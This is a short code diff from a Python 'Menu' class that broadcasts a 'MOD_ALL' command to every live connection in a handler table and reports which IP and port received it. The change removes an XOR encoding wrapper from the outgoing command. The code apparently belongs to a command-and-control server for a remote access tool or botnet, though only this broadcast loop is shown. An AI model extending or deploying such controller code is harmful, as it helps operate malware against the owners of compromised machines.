@@ -99,7 +99,7 @@ class Menu:
                     break
                 for key in Handler.dict_conn.keys():
                     if(Handler.dict_conn[key][NB_ALIVE]):
-                        if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], XOREncryption(("MOD_ALL:"+forall)).encode()):
+                        if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], "MOD_ALL:"+forall):
                             printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                         else:
                             printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
